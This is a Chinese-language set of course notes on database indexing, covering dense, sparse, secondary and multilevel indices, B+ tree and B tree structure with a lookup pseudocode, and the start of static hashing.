<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 6598 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 28 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 20 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 23 分钟</p>
</div>
<p>索引的结构一般由搜索键(search key)和指针(pointer)组成</p>
<h2 id="note-db-indexing-ordered-indices">Ordered indices<a class="headerlink" href="#note-db-indexing-ordered-indices" title="Permanent link">&para;</a></h2>
<p>在有序索引中，索引条目按照搜索键值进行排序存储，例如图书馆中的作者目录。</p>
<ul>
<li>
<p><strong>顺序排序文件(Sequentially ordered file)</strong> : 文件(数据文件)中的记录按搜索键排序。</p>
</li>
<li>
<p><strong>主索引(Primary index)</strong> : 搜索键与顺序排序数据文件的搜索键相等的索引。(与对应的数据文件本身的排列顺序相同的索引称为主索引)</p>
</li>
<li>也称为聚集索引(clustering index)</li>
<li>主索引的搜索键通常是但并非一定是主码(primary key)</li>
<li>
<p>非顺序文件没有主索引，但关系可以有主键</p>
</li>
<li>
<p><strong>索引顺序文件(Index-sequential file)</strong> : 带有主索引的顺序排序文件</p>
</li>
<li>
<p><strong>辅助索引(Secondary index)</strong> : 搜索键与顺序排序数据文件的搜索键不相等的索引。Also called non-clustering index</p>
<blockquote>
<p>例如，在以书号为搜索键的索引中，书名和作者名是辅助索引</p>
</blockquote>
</li>
</ul>
<h3 id="note-db-indexing-dense-index">Dense Index<a class="headerlink" href="#note-db-indexing-dense-index" title="Permanent link">&para;</a></h3>
<ul>
<li>索引文件中的每个搜索键值都对应一个索引条目</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/index-1.png" width="500" />

<figcaption>ID 索引</figcaption>
</figure>
<figure>
<img alt="" src="../NOTE/DB/img/index-2.png" width="500" />

<figcaption>Name 索引</figcaption>
</figure>
<h3 id="note-db-indexing-sparse-index">Sparse Index<a class="headerlink" href="#note-db-indexing-sparse-index" title="Permanent link">&para;</a></h3>
<ul>
<li>稀疏索引仅包含部分搜索键值的索引条目。通常，一个数据块对应一个索引条目，一个块包含多个有序的数据记录。</li>
</ul>
<p><em>稀疏索引仅适用于数据文件记录按搜索键顺序排列的情况</em>。</p>
<p>要定位搜索键值为 K 的记录，搜索方法如下：</p>
<ol>
<li>
<p>找到索引记录中小于 K 的最大搜索键值。</p>
</li>
<li>
<p>从索引条目指向的记录开始，顺序搜索文件。</p>
</li>
</ol>
<figure>
<img alt="" src="../NOTE/DB/img/index-3.png" width="500" />

<figcaption>稀疏索引</figcaption>
</figure>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Sparse index 智能用于顺序的文件，而dense index则可以用于顺序和非顺序文件</p>
</div>
<h3 id="note-db-indexing-secondary-index">Secondary Index<a class="headerlink" href="#note-db-indexing-secondary-index" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>辅助索引(Secondary Index)</strong> : 在实际应用中，常常需要查找某个字段中满足特定条件的所有记录，而该字段并不是主索引的搜索键。<ul>
<li>例如：在按账户号码顺序存储的账户数据库中，我们可能希望查找所有余额为指定值或在某个范围内的账户。</li>
<li>我们可以为每个搜索键值创建一个辅助索引，索引记录指向一个桶(Bucket)，该桶包含指向所有具有该特定搜索键值的实际记录的指针。</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/index-4.png" width="500" />

<figcaption>一个balance对应了很多个account，将它们都装在一个桶中</figcaption>
</figure>
<h3 id="note-db-indexing-multilevel-index">Multilevel Index<a class="headerlink" href="#note-db-indexing-multilevel-index" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>多级索引(Multilevel Index)</strong> : 当主索引过大而无法放入内存时，访问变得昂贵。<ul>
<li>例如：1,000,000 条记录 / 每块 10 条记录 = 100,000 块 = 100,000 个索引条目，(稀疏索引) / 每块 100 个条目 = 1000 块 (稀疏索引文件的大小)。</li>
<li>二分查找: 「log2(1000)」= 9 次块读取，10*15ms = 150ms。</li>
<li>为了减少对索引记录的磁盘访问次数，将磁盘上的主索引视为顺序文件，并在其上构建稀疏索引。</li>
<li>外层索引 – 主索引的稀疏索引。</li>
<li>内层索引 – 主索引文件。</li>
<li>如果即使是外层索引也太大而无法放入主存，则可以创建另一个级别的索引，依此类推。(可以推广到任意多层索引)</li>
<li>在文件中插入或删除时，所有级别的索引都必须更新。</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/index-5.png" width="500" />

<figcaption>多级索引示意图</figcaption>
</figure>
<p>多级索引也可以用于聚集索引和非聚集索引;</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-6.png" width="500" />

<figcaption>多级索引示意图</figcaption>
</figure>
<h3 id="note-db-indexing-deletion-of-index">Deletion of index<a class="headerlink" href="#note-db-indexing-deletion-of-index" title="Permanent link">&para;</a></h3>
<p>在数据库中删除记录时，索引文件也需要相应更新。以下是单级索引删除的步骤：</p>
<p><em>步骤1：系统在数据文件中找到记录，然后删除该记录。</em></p>
<p><em>步骤2：更新索引文件：</em></p>
<ul>
<li>
<p><strong>情况1：密集索引 (Dense indices)</strong></p>
</li>
<li>
<p>如果被删除的记录是其特定搜索键值的唯一记录，则从索引文件中删除相应的索引条目。（单记录，即search-key有唯一性）</p>
</li>
<li>
<p>否则，（多条记录，即search-key无唯一性）</p>
<ul>
<li>
<p>如果有多个指针指向具有相同搜索键值的所有记录，则从索引条目中删除指向被删除记录的指针。（对应辅助索引的情况）</p>
</li>
<li>
<p>否则，（对应主索引）</p>
</li>
<li>
<p>如果被删除的记录是第一个被指向的记录，则将指针更改为下一条记录。</p>
</li>
<li>
<p>否则，不需要对索引条目进行任何操作。</p>
</li>
</ul>
</li>
<li>
<p><strong>情况2：稀疏索引 (Sparse indices)</strong></p>
</li>
<li>
<p>如果被删除记录的搜索键值未出现在索引中，则不需要对索引进行任何操作。</p>
</li>
<li>
<p>否则，如果索引文件中存在该搜索键的索引条目，则通过用数据文件中的下一个搜索键值（按搜索键顺序）替换该条目来删除它。</p>
</li>
<li>
<p>如果下一个搜索键值已经有索引条目，则删除索引条目而不是替换。</p>
</li>
</ul>
<p>对于多级索引：由底层逐级向上层扩展，每一层的处理过程与上述单层索引情况下类似。</p>
<h3 id="note-db-indexing-insertion-of-index">Insertion of index<a class="headerlink" href="#note-db-indexing-insertion-of-index" title="Permanent link">&para;</a></h3>
<p>在数据库中插入记录时，索引文件也需要相应更新。以下是单级索引插入的步骤：</p>
<p><em>步骤1：利用索引找到插入位置，在数据文件中插入记录。</em></p>
<p><em>步骤2：更新索引文件：</em></p>
<ul>
<li>
<p><strong>情况1：密集索引 (Dense indices)</strong></p>
</li>
<li>
<p>如果搜索键值未出现在索引中，则插入一个包含该搜索键值的索引条目。</p>
</li>
<li>
<p>否则，</p>
<ul>
<li>
<p>如果有多个指针指向具有相同搜索键值的所有记录，则在索引条目中添加一个指向新记录的指针。</p>
</li>
<li>
<p>否则，不需要对索引条目进行任何操作。</p>
</li>
</ul>
</li>
<li>
<p><strong>情况2：稀疏索引 (Sparse indices)</strong></p>
</li>
<li>
<p>如果创建了一个新块，则将新块中出现的第一个搜索键值插入到索引中。</p>
</li>
<li>
<p>如果新记录在其块中具有最小的搜索键值，则更新索引条目。</p>
</li>
<li>
<p>否则，不需要对索引进行任何更改。</p>
</li>
</ul>
<p>对于多级索引：由底层逐级向上层扩展，每一层的处理过程与上述单层索引情况下类似。</p>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>索引在搜索记录时提供了显著的优势。</p>
<p>但是：更新索引会在数据库修改时带来额外的开销——当文件被修改时，文件上的每个索引都必须更新。</p>
<p>使用主索引的顺序扫描是高效的，但使用辅助索引的顺序扫描则代价高昂。每次记录访问可能会从磁盘中获取一个新块。块的获取大约需要5到10毫秒，而内存访问大约需要100纳秒。</p>
</div>
<h2 id="note-db-indexing-b-tree-indices">B + Tree indices<a class="headerlink" href="#note-db-indexing-b-tree-indices" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="#note-ads-wk2">B+ Tree</a></p>
</blockquote>
<div class="admonition quote">
<p class="admonition-title">B+树索引的优缺点</p>
<p><strong>索引顺序文件的缺点：</strong></p>
<ul>
<li>随着文件的增长，性能会下降，因为会创建许多溢出块。</li>
<li>需要定期重组整个文件。</li>
</ul>
<p><strong>B+树索引文件的优点：</strong></p>
<ul>
<li>在插入和删除时，能够通过小的局部变化自动重组自身。</li>
<li>不需要重组整个文件来维持性能。</li>
</ul>
<p><strong>B+树的（次要）缺点：</strong></p>
<ul>
<li>额外的插入和删除开销；空间开销。</li>
</ul>
<p><strong>B+树的优点超过了缺点</strong></p>
<ul>
<li>B+树被广泛使用。</li>
</ul>
</div>
<h3 id="note-db-indexing-basic-structure">Basic Structure<a class="headerlink" href="#note-db-indexing-basic-structure" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">B+树</p>
<p>B+树是一种平衡树,我们说B+树是m阶的，如果其具有以下特性：</p>
<ul>
<li>每个节点最多有<span class="arithmatex">\(m\)</span>个子节点。</li>
<li>除根节点外，每个非叶子节点至少有<span class="arithmatex">\(\lceil m/2 \rceil\)</span>个子节点。</li>
<li>
<p>根节点至少有两个子节点（除非它是叶子节点）。</p>
</li>
<li>
<p>每个非叶子节点最多有<span class="arithmatex">\(m-1\)</span>个搜索键值。</p>
</li>
<li>
<p>每个非叶子节点至少有<span class="arithmatex">\(\lceil m/2 \rceil - 1\)</span>个搜索键值。</p>
</li>
<li>
<p>叶子节点的值个数在<span class="arithmatex">\(\lceil m/2 \rceil - 1\)</span>和<span class="arithmatex">\(m-1\)</span>之间。</p>
</li>
<li>
<p>所有叶子节点在同一层。</p>
</li>
<li>
<p>如果根节点是叶子节点（即树中没有其他节点），它可以有0到<span class="arithmatex">\(m-1\)</span>个值。</p>
</li>
</ul>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/index-7.png" width="500" />

<figcaption>4阶B+树</figcaption>
</figure>
<figure>
<img alt="" src="../NOTE/DB/img/index-8.png" width="500" />

<figcaption>B+树的Node</figcaption>
</figure>
<p>其中：</p>
<ul>
<li><span class="arithmatex">\(K_i\)</span> 是搜索键值</li>
<li><span class="arithmatex">\(P_i\)</span> 是子节点指针</li>
</ul>
<p>一般而言</p>
<div class="arithmatex">\[
    K_1 &lt; K_2 &lt; \cdots &lt; K_{n-1}
\]</div>
<div class="admonition property">
<p class="admonition-title">B+树叶子节点的特性</p>
<p>在B+树中，对于<span class="arithmatex">\(i = 1, 2, \ldots, n-1\)</span>，指针<span class="arithmatex">\(P_i\)</span>要么指向具有搜索键值<span class="arithmatex">\(K_i\)</span>的文件记录，要么指向一个指向文件记录的指针桶，每个记录都有搜索键值<span class="arithmatex">\(K_i\)</span>。只有当搜索键不构成主键时才需要指针桶。（类似于密集索引，每个搜索键出现在叶节点中）</p>
<p>如果<span class="arithmatex">\(L_i, L_j\)</span>是叶节点且<span class="arithmatex">\(i &lt; j\)</span>，则<span class="arithmatex">\(L_i\)</span>中的所有搜索键值都小于<span class="arithmatex">\(L_j\)</span>的搜索键值。（叶节点间的搜索键不重叠，且所有左节点中的搜索键值一定小于右节点中的搜索键值）</p>
<p>必须有<span class="arithmatex">\(\lceil (n-1)/2 \rceil\)</span>到<span class="arithmatex">\(n-1\)</span>个搜索键。当<span class="arithmatex">\(n = 5\)</span>时，搜索键的数量满足<span class="arithmatex">\(2 \leqslant \text{搜索键数量} \leqslant 4\)</span>。</p>
<p>指针<span class="arithmatex">\(P_n\)</span>指向按搜索键顺序的下一个叶节点，这对于文件的顺序处理非常方便。</p>
</div>
<div class="admonition property">
<p class="admonition-title">B+树非叶节点的特性</p>
<p>非叶节点的指针（子树）数量在<span class="arithmatex">\(\lceil n/2 \rceil\)</span>和<span class="arithmatex">\(n\)</span>之间。扇出数（Fanout）即为节点中的指针数量。非叶节点在叶节点上形成一个多级稀疏索引。对于一个具有<span class="arithmatex">\(m\)</span>个指针的非叶节点：</p>
<ul>
<li><span class="arithmatex">\(P_1\)</span>所指的子树中的所有搜索键值都小于<span class="arithmatex">\(K_1\)</span>。</li>
<li>对于<span class="arithmatex">\(2 \leqslant i \leqslant n - 1\)</span>，<span class="arithmatex">\(P_i\)</span>所指的子树中的所有搜索键值都大于或等于<span class="arithmatex">\(K_{i-1}\)</span>且小于<span class="arithmatex">\(K_i\)</span>。</li>
<li><span class="arithmatex">\(P_n\)</span>所指的子树中的所有搜索键值都大于或等于<span class="arithmatex">\(K_{n-1}\)</span>。</li>
</ul>
<p>可以理解为<span class="arithmatex">\(P_i\)</span> 和 <span class="arithmatex">\(K_{i-1}\)</span> 是一对(从后往前看)，指向的是以<span class="arithmatex">\(K_{i-1}\)</span>为第一个搜索键值的节点;</p>
</div>
<div class="admonition section">
<p class="admonition-title">B+树的优势</p>
<p>由于节点间的连接是通过指针完成的，因此"逻辑上"相近的块不需要"物理上"相近。B+树的非叶节点层级构成了一个稀疏索引的层次结构。B+树包含的层级数量相对较少（与主文件的大小呈对数关系），因此可以高效地进行搜索。对主文件的插入和删除操作可以高效地处理，因为索引可以在对数时间内重构。</p>
</div>
<h3 id="note-db-indexing-queries">Queries<a class="headerlink" href="#note-db-indexing-queries" title="Permanent link">&para;</a></h3>
<div class="language-C++ highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-indexing-__codelineno-0-1"></a><span class="n">Find</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">search</span><span class="o">-</span><span class="n">key</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="n">V</span><span class="p">.</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-db-indexing-__codelineno-0-2"></a><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-db-indexing-__codelineno-0-3"></a><span class="n">While</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">leaf</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-db-indexing-__codelineno-0-4"></a><span class="w">    </span><span class="n">Let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="err">≤</span><span class="w"> </span><span class="n">Ki</span><span class="p">.</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-db-indexing-__codelineno-0-5"></a><span class="w">    </span><span class="n">If</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="n">exists</span><span class="p">,</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">last</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">null</span><span class="w"> </span><span class="n">pointer</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">C</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-db-indexing-__codelineno-0-6"></a><span class="w">    </span><span class="n">Else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-db-indexing-__codelineno-0-7"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Ki</span><span class="p">)</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pi</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-db-indexing-__codelineno-0-8"></a><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pi</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-db-indexing-__codelineno-0-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-db-indexing-__codelineno-0-10"></a><span class="p">}</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-db-indexing-__codelineno-0-11"></a><span class="n">Let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">Ki</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">V</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-db-indexing-__codelineno-0-12"></a><span class="n">If</span><span class="w"> </span><span class="n">there</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">pointer</span><span class="w"> </span><span class="n">Pi</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">desired</span><span class="w"> </span><span class="n">record</span><span class="p">.</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-db-indexing-__codelineno-0-13"></a><span class="n">Else</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">search</span><span class="o">-</span><span class="n">key</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="n">exists</span><span class="p">.</span>
</span></code></pre></div>
<div class="admonition property">
<p class="admonition-title">B+树的性能分析</p>
<p>如果文件中有<span class="arithmatex">\(K\)</span>个搜索键值，树的高度不超过<span class="arithmatex">\(\lceil \log_{\lceil n/2 \rceil}(K) \rceil\)</span>。一个节点通常与磁盘块大小相同，通常为4千字节，而<span class="arithmatex">\(n\)</span>通常约为100（每个索引条目40字节）。对于100万个搜索键值且<span class="arithmatex">\(n = 100\)</span>，在查找中最多访问<span class="arithmatex">\(\log_{50}(1,000,000) = 4\)</span>个节点。相比之下，具有100万个搜索键值的平衡二叉树在查找中大约需要访问20个节点。上述差异是显著的，因为每次节点访问可能需要一次磁盘I/O，耗时约20毫秒。</p>
</div>
<p>在B+树中处理重复的搜索键值需要特殊的机制：</p>
<ul>
<li><strong>重复搜索键的存在位置</strong>：</li>
<li>
<p>在叶节点和内部节点中都可能有重复的搜索键</p>
</li>
<li>
<p><strong>重复键的性质</strong>：</p>
</li>
<li>我们不能保证 <span class="arithmatex">\(K_1 &lt; K_2 &lt; K_3 &lt; \cdots &lt; K_{n-1}\)</span></li>
<li>
<p>但可以保证 <span class="arithmatex">\(K_1 \leq K_2 \leq K_3 \leq \cdots \leq K_{n-1}\)</span></p>
</li>
<li>
<p><strong>搜索键在子树中的分布</strong>：</p>
</li>
<li>
<p>搜索键在子树中的分布必须满足：</p>
<ul>
<li>搜索键值 <span class="arithmatex">\(\leq K_i\)</span>，但不一定小于 <span class="arithmatex">\(K_i\)</span></li>
<li>若要查看某个搜索键值 <span class="arithmatex">\(V\)</span> 是否在两个叶节点 <span class="arithmatex">\(L_i\)</span> 和 <span class="arithmatex">\(L_{i+1}\)</span> 中存在，则在父节点 <span class="arithmatex">\(K\)</span> 中必须等于 <span class="arithmatex">\(V\)</span></li>
</ul>
</li>
<li>
<p><strong>查找过程修改</strong>：</p>
</li>
<li>
<p>我们需要修改查找过程如下：</p>
<ul>
<li>遍历指针 <span class="arithmatex">\(P_i\)</span>，即使当 <span class="arithmatex">\(V = K_i\)</span> 时</li>
<li>当我们到达叶节点 <span class="arithmatex">\(C\)</span> 时，检查 <span class="arithmatex">\(C\)</span> 是否只有小于 <span class="arithmatex">\(V\)</span> 的搜索键值</li>
<li>如果是，在检查 <span class="arithmatex">\(C\)</span> 是否包含 <span class="arithmatex">\(V\)</span> 之前，将 <span class="arithmatex">\(C\)</span> 设置为 <span class="arithmatex">\(C\)</span> 的右兄弟节点</li>
</ul>
</li>
<li>
<p><strong>printAll过程</strong>：</p>
</li>
<li>使用修改后的查找过程来找到 <span class="arithmatex">\(V\)</span> 的第一次出现</li>
<li>遍历连续的叶节点以找到 <span class="arithmatex">\(V\)</span> 的所有出现</li>
</ul>
<h3 id="note-db-indexing-insertion">Insertion<a class="headerlink" href="#note-db-indexing-insertion" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><strong>找到叶节点</strong>：找到搜索键值将出现的叶节点。</p>
</li>
<li>
<p><strong>检查键值是否存在</strong>：</p>
<ul>
<li>如果搜索键值已经存在于叶节点中：<ul>
<li>将记录添加到文件中。</li>
<li>如果需要，添加指向桶的指针。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>键值不存在</strong>：</p>
<ul>
<li>将记录添加到主文件中（如果需要，创建一个桶）。</li>
<li>如果叶节点中有空间，插入（键值，指针）对到叶节点中。</li>
<li>否则，分裂节点（包括新插入的（键值，指针）条目），具体步骤如下：</li>
</ul>
</li>
<li>
<p><strong>分裂叶节点</strong>：</p>
<ul>
<li>将n个（搜索键值，指针）对（包括正在插入的那个）按顺序排列。</li>
<li>将前⎡n/2⎤个放入原节点，其余的放入新节点。</li>
<li>设新节点为p，设k为p中最小的键值。在被分裂节点的父节点中插入（k,p）。</li>
<li>如果父节点已满，分裂它并将分裂向上传播。</li>
</ul>
</li>
<li>
<p><strong>节点分裂向上传播</strong>：</p>
<ul>
<li>分裂节点的过程向上进行，直到找到一个未满的节点。</li>
<li>在最坏的情况下，根节点可能会被分裂，从而增加树的高度1。</li>
</ul>
</li>
</ol>
<h3 id="note-db-indexing-deletion">Deletion<a class="headerlink" href="#note-db-indexing-deletion" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><strong>找到要删除的记录</strong>：</p>
<ul>
<li>在主文件中找到要删除的记录，并将其删除。</li>
<li>如果存在桶，则从桶中删除记录。</li>
</ul>
</li>
<li>
<p><strong>从叶节点中删除</strong>：</p>
<ul>
<li>如果没有桶或桶已空，从叶节点中删除（搜索键值，指针）。</li>
</ul>
</li>
<li>
<p><strong>节点合并</strong>：</p>
<ul>
<li>如果由于删除导致节点条目过少，并且节点与其兄弟节点的条目可以合并成一个节点，则合并兄弟节点：</li>
<li>将两个节点中的所有搜索键值插入到一个节点（左侧节点）中，并删除另一个节点。</li>
<li>从其父节点中删除（Ki–1, Pi），其中Pi是指向被删除节点的指针，递归使用上述过程。</li>
</ul>
</li>
<li>
<p><strong>指针重新分配</strong>：</p>
<ul>
<li>如果由于删除导致节点条目过少，但节点与其兄弟节点的条目不能合并成一个节点，则重新分配指针：</li>
<li>在节点与其兄弟节点之间重新分配指针，使得两者都有超过最小数量的条目。</li>
<li>更新节点父节点中的相应搜索键值。</li>
</ul>
</li>
<li>
<p><strong>级联删除</strong>：</p>
<ul>
<li>节点删除可能会向上级联，直到找到一个有⎡n/2⎤或更多指针的节点。</li>
</ul>
</li>
<li>
<p><strong>根节点处理</strong>：</p>
<ul>
<li>如果删除后根节点只有一个指针，则删除根节点，唯一的子节点成为新的根节点。</li>
</ul>
</li>
</ol>
<h3 id="note-db-indexing-b-tree-indices_1">B Tree indices<a class="headerlink" href="#note-db-indexing-b-tree-indices_1" title="Permanent link">&para;</a></h3>
<p>B树与B+树相似，但B树允许搜索键值只出现一次，从而消除了搜索键的冗余存储。在B树中，非叶节点中的搜索键不会出现在其他地方；因此，每个非叶节点中的搜索键必须包含一个额外的指针字段。</p>
<p>在B树中，所有节点都是广义的叶节点。</p>
<ul>
<li><strong>非叶节点</strong>：指针Bi指向桶或文件记录。</li>
</ul>
<p>即B树的非叶节点与B+树的非叶节点类似，但B树的非叶节点中包含搜索键值，而B+树的非叶节点中不包含搜索键值。</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-9.png" width="500" />

<figcaption>B树和B+树</figcaption>
</figure>
<p><strong>B树索引的优点：</strong></p>
<ul>
<li>可能使用比对应的B+树更少的树节点（因为没有重复）。</li>
<li>有时可以在到达叶节点之前找到搜索键值。</li>
</ul>
<p><strong>B树索引的缺点：</strong></p>
<ul>
<li>只有一小部分搜索键值可以提前找到。</li>
<li>非叶节点较大，因此扇出减少。因此，B树通常比对应的B+树具有更大的深度。</li>
<li>插入和删除比在B+树中更复杂。</li>
<li>实现比B+树更困难。</li>
</ul>
<p>通常情况下，B树的优点并不超过其缺点,B+树更受欢迎。</p>
<h2 id="note-db-indexing-static-hashing">Static Hashing<a class="headerlink" href="#note-db-indexing-static-hashing" title="Permanent link">&para;</a></h2>
<p>静态哈希是一种哈希文件组织方法，其中桶的数量在创建时是固定的，并且不会随着数据的增加而改变。</p>
<ul>
<li>
<p><strong>桶（Bucket）</strong>：桶是一个存储单元，包含一个或多个记录（桶通常是一个磁盘块）。</p>
</li>
<li>
<p><strong>哈希函数</strong>：在哈希文件组织中，我们使用哈希函数直接从记录的搜索键值获取桶。哈希函数h是从所有搜索键值集合K到所有桶地址集合B的一个函数。</p>
</li>
<li>
<p><strong>记录定位</strong>：哈希函数用于定位记录以进行访问、插入以及删除。</p>
</li>
<li>
<p><strong>冲突处理</strong>：具有不同搜索键值的记录可能会映射到同一个桶，因此必须顺序搜索整个桶以定位记录。</p>
</li>
</ul>
<p>静态哈希的优点是简单且易于实现，但其缺点是当数据量增加时，可能会导致桶的溢出，从而需要额外的溢出处理机制。</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-10.png" width="500" />

<figcaption>静态哈希示意图</figcaption>
</figure>
<div class="admonition note">
<p class="admonition-title">哈希函数的特性</p>
<p>最差的哈希函数会将所有搜索键值映射到同一个桶中，这使得访问时间与文件中搜索键值的数量成正比。</p>
<p>理想的哈希函数是均匀的，即每个桶被分配到相同数量的搜索键值，这样可以确保每个桶中记录的数量相同，不受文件中搜索键值实际分布的影响。</p>
<p>典型的哈希函数会对搜索键的内部二进制表示进行计算。例如，对于一个字符串类型的搜索键，可以将字符串中所有字符的二进制表示相加，然后对桶的数量取模，返回结果。</p>
<p>这种方法确保了哈希函数的随机性，使得每个桶中分配的记录数量相对均匀，从而提高了哈希表的访问效率。</p>
</div>
<h3 id="note-db-indexing-overflows">Overflows<a class="headerlink" href="#note-db-indexing-overflows" title="Permanent link">&para;</a></h3>
<p>桶溢出可能发生在以下几种情况下：</p>
<ul>
<li><strong>桶数量不足</strong>：当桶的数量不足以容纳所有记录时，可能会导致桶溢出。</li>
<li><strong>记录分布不均</strong>：这可能由于以下两个原因导致：</li>
<li>多个记录具有相同的搜索键值。</li>
<li>所选的哈希函数产生了非均匀的键值分布。</li>
</ul>
